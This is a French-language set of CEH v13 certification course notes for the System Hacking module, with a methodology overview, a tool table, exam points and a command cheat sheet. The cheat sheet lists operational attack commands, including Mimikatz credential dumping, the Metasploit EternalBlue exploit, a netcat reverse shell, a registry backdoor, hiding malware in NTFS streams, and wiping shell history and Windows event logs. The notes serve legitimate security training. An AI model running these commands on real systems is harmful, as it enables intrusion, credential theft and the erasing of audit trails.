# 💻 CEH v13 — Module 6 : System Hacking

> **Certified Ethical Hacker v13** | Notes de cours complètes  
> 📅 Dernière mise à jour : Mars 2026  
> ⚖️ **Poids à l'examen : 15%** — Domaine le plus important du CEH !

---

## 🗂️ Table des matières

| # | Fichier | Contenu |
|---|---------|---------|
| 01 | [Introduction & Méthodologie](./01-introduction-methodology.md) | CEH Hacking Methodology, objectifs, phases |
| 02 | [Password Cracking](./02-password-cracking.md) | Types d'attaques, SAM, NTLM, Kerberos, outils |
| 03 | [Exploitation de vulnérabilités](./03-vulnerability-exploitation.md) | Metasploit, Buffer Overflow, AI-powered tools |
| 04 | [Escalade de privilèges](./04-privilege-escalation.md) | DLL Hijacking, UAC Bypass, Named Pipe, Spectre/Meltdown |
| 05 | [Maintien de l'accès](./05-maintaining-access.md) | Backdoors, Keyloggers, Spyware, Persistence |
| 06 | [Rootkits & Fichiers cachés](./06-rootkits-hidden-files.md) | Types de rootkits, NTFS ADS, détection |
| 07 | [Stéganographie](./07-steganography.md) | Techniques, outils, stéganalyse |
| 08 | [Covering Tracks](./08-covering-tracks.md) | Effacement logs, Windows/Linux, outils |
| 09 | [Active Directory Attacks](./09-active-directory-attacks.md) | Pass-the-Hash, Kerberoasting, Golden Ticket |

---

## 🎯 Objectifs du module

À la fin de ce module, vous serez capable de :

- ✅ Effectuer un cracking de mots de passe (brute-force, dictionnaire, rainbow tables)
- ✅ Exploiter des vulnérabilités via Metasploit et buffer overflow
- ✅ Escalader les privilèges sur Windows et Linux
- ✅ Maintenir un accès persistant (backdoors, keyloggers, trojans)
- ✅ Cacher des fichiers malveillants via rootkits, NTFS ADS, stéganographie
- ✅ Effacer les traces de compromission
- ✅ Conduire des attaques Active Directory (Pass-the-Hash, Kerberoasting)

---

## 🔑 La méthodologie CEH — 5 étapes

```
┌──────────────────────────────────────────────────────────────┐
│              CEH SYSTEM HACKING METHODOLOGY                  │
├──────────────────────────────────────────────────────────────┤
│  1. GAINING ACCESS        → Password cracking, exploits      │
│  2. ESCALATING PRIVILEGES → DLL Hijacking, UAC Bypass        │
│  3. EXECUTING APPS        → Keyloggers, backdoors, trojans   │
│  4. HIDING FILES          → Rootkits, NTFS ADS, Stéganog.    │
│  5. COVERING TRACKS       → Effacement logs, anti-forensics  │
└──────────────────────────────────────────────────────────────┘
```

---

## ⚡ Cheat Sheet — Commandes essentielles

```bash
# ═══════════════════════════════════════════════════
# PASSWORD CRACKING
# ═══════════════════════════════════════════════════
# Hashcat — NTLM dictionary attack
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Hashcat — NTLM brute-force 8 chars
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# John the Ripper
john --wordlist=rockyou.txt --format=NT hashes.txt

# Mimikatz — Dump credentials LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# ═══════════════════════════════════════════════════
# EXPLOITATION — METASPLOIT
# ═══════════════════════════════════════════════════
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit

# ═══════════════════════════════════════════════════
# PRIVILEGE ESCALATION — WINDOWS
# ═══════════════════════════════════════════════════
# Vérifier les privilèges
whoami /priv

# Meterpreter
meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester

# ═══════════════════════════════════════════════════
# PRIVILEGE ESCALATION — LINUX
# ═══════════════════════════════════════════════════
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel exploits
uname -a

# ═══════════════════════════════════════════════════
# MAINTAINING ACCESS
# ═══════════════════════════════════════════════════
# Netcat backdoor
nc -lvnp 4444
nc <IP> 4444 -e /bin/bash

# Windows persistence — Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# ═══════════════════════════════════════════════════
# NTFS ADS (Alternate Data Streams)
# ═══════════════════════════════════════════════════
# Cacher un fichier dans un ADS
type malware.exe > legit.txt:malware.exe

# Lister les ADS
dir /r
streams.exe -s <directory>

# ═══════════════════════════════════════════════════
# COVERING TRACKS — LINUX
# ═══════════════════════════════════════════════════
export HISTSIZE=0
history -c && history -w
shred ~/.bash_history && cat /dev/null > ~/.bash_history

# ═══════════════════════════════════════════════════
# COVERING TRACKS — WINDOWS
# ═══════════════════════════════════════════════════
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

---

## 📊 Outils clés du Module 6

| Catégorie | Outils |
|-----------|--------|
| **Password Cracking** | Hashcat, John the Ripper, Ophcrack, L0phtCrack, Hydra |
| **Credential Dumping** | Mimikatz, ProcDump, secretsdump.py, WCE |
| **Exploitation** | Metasploit, DeepExploit, Nebula (AI), Immunity Debugger |
| **Privilege Escalation** | BeRoot, PowerSploit, PEASS-ng, WinPEAS, LinPEAS |
| **Backdoors** | Netcat, Meterpreter, PowerShell Empire, Cobalt Strike |
| **Keyloggers** | REFOG, Spyrix, Ardamax, Metasploit keyscan |
| **Rootkits** | Horse Pill, GrayFish, Necurs, Azazel (Linux) |
| **Steganographie** | OpenStego, QuickStego, Steghide, DeepSound, ShellGPT |
| **Covering Tracks** | CCleaner, DBAN, Privacy Eraser, Wipe |
| **AD Attacks** | Mimikatz, Rubeus, BloodHound, CrackMapExec, Impacket |

---

## 🏆 Points importants pour l'examen

> 📝 **15% du score total** — Portez une attention particulière à ces concepts !

- Le **SAM** (Security Account Manager) stocke les hash de mots de passe Windows
- **LM hash** : faible, max 14 chars, insensible à la casse → à ne plus utiliser
- **NTLM** : challenge/response — vulnérable au Pass-the-Hash
- **Kerberos** : authentification à tickets — vulnérable au Kerberoasting et Golden Ticket
- **Pass-the-Hash** : utilise le hash NTLM sans connaître le mot de passe en clair
- **Golden Ticket** : accès illimité en forgeant un TGT Kerberos (valide 10 ans)
- **Rootkits kernel** : les plus dangereux — se cachent sous l'OS
- **NTFS ADS** : cache des fichiers dans les flux alternatifs de données

---

> ⚠️ **Rappel éthique** : Toutes les techniques de ce module sont enseignées à des fins **défensives et de tests autorisés uniquement**. Leur utilisation sans autorisation est **illégale**.
